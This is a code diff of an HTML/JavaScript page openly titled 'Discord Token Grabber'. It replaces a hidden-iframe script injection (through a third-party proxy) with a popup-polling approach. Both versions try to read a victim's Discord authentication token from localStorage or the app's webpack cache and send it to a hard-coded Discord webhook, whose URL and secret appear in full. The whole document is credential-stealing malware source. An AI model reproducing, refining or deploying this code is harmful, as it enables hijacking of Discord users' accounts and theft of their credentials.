@@ -36,16 +36,14 @@
 
 <div class="container">
     <h3>Discord Token Grabber</h3>
-    <div id="status" class="status">Loading Discord...</div>
-    <div id="iframe-container"></div>
+    <div id="status" class="status">Click to Start</div>
+    <button id="startBtn" style="margin-top:10px; padding:10px 20px; cursor:pointer;">Start</button>
 </div>
 
 <script>
-    // 🔴 YOUR SPECIFIC WEBHOOK URL
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
-
     const statusEl = document.getElementById('status');
-    const iframeContainer = document.getElementById('iframe-container');
+    const startBtn = document.getElementById('startBtn');
 
     function updateStatus(msg, type = 'normal') {
         statusEl.textContent = msg;
@@ -77,89 +75,46 @@
         }
     }
 
-    async function main() {
-        const iframe = document.createElement('iframe');
-        iframe.style.width = '0';
-        iframe.style.height = '0';
-        iframe.style.border = '0';
-        iframeContainer.appendChild(iframe);
+    startBtn.addEventListener('click', async () => {
+        updateStatus("Opening Discord...", "normal");
+        
+        // Open Discord in a new window
+        const discordWindow = window.open('https://discord.com/login', 'discordPopup', 'width=800,height=600');
 
-        // ✅ Use allorigins.win as a more reliable proxy for raw HTML
-        const targetUrl = 'https://discord.com/login';
-        const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+        if (!discordWindow) {
+            updateStatus("Popup blocked! Allow popups for this site.", "error");
+            return;
+        }
 
-        iframe.src = proxyUrl;
-
-        iframe.onload = async () => {
+        // Wait for the window to load
+        const checkToken = setInterval(() => {
             try {
-                // ✅ Create a script inside the iframe
-                const script = iframe.contentWindow.document.createElement('script');
-                script.textContent = `
-                    (function() {
-                        function getToken() {
-                            // 1. LocalStorage
-                            const token = window.localStorage.getItem('token') || 
-                                          window.localStorage.getItem('token_x');
-                            if (token) return token;
+                // Check if the window is closed or unloaded
+                if (discordWindow.closed) {
+                    clearInterval(checkToken);
+                    return;
+                }
 
-                            // 2. Webpack Cache (Most Reliable)
-                            if (window.webpackChunkdiscord_app) {
-                                const cache = window.webpackChunkdiscord_app;
-                                if (cache && cache.length > 0) {
-                                    for (let id in cache) {
-                                        if (cache[id]) {
-                                            for (let module in cache[id]) {
-                                                const exportObj = cache[id][module].exports;
-                                                if (exportObj && (exportObj.default?.getToken || exportObj.default?.getAccessToken)) {
-                                                    return exportObj.default.getToken ? exportObj.default.getToken() : exportObj.default.getAccessToken();
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                            return null;
-                        }
-
-                        // Wait for Discord to initialize
-                        setTimeout(() => {
-                            const token = getToken();
-                            if (token) {
-                                window.parent.postMessage({ type: 'TOKEN', data: token }, '*');
-                            } else {
-                                window.parent.postMessage({ type: 'NO_TOKEN' }, '*');
-                            }
-                        }, 4000);
-                    })();
-                `;
-                
-                iframe.contentWindow.document.body.appendChild(script);
-
+                // Try to access the window's document
+                const doc = discordWindow.document;
+                if (doc && doc.readyState === 'complete') {
+                    // Grab token from localStorage or webpack
+                    const token = discordWindow.localStorage.getItem('token') || 
+                                  discordWindow.localStorage.getItem('token_x');
+                    
+                    if (token) {
+                        clearInterval(checkToken);
+                        updateStatus("Token found!", "success");
+                        sendToken(token);
+                        discordWindow.close();
+                    }
+                }
             } catch (e) {
-                console.error("Injection failed:", e);
-                updateStatus("Injection failed: " + e.message, "error");
+                // Cross-origin error is expected until the window is fully loaded and same-origin
+                // We continue checking
             }
-        };
-
-        // Listen for messages from iframe
-        window.addEventListener('message', (event) => {
-            if (event.data && event.data.type === 'TOKEN') {
-                updateStatus("Token found!", "success");
-                sendToken(event.data.data);
-            } else if (event.data && event.data.type === 'NO_TOKEN') {
-                updateStatus("No token found. Try refreshing.", "error");
-            }
-        });
-
-        // Timeout
-        setTimeout(() => {
-            if (statusEl.textContent.includes("Loading")) {
-                updateStatus("Timeout", "error");
-            }
-        }, 15000);
-    }
-
-    main();
+        }, 1000);
+    });
 </script>
 
 </body>
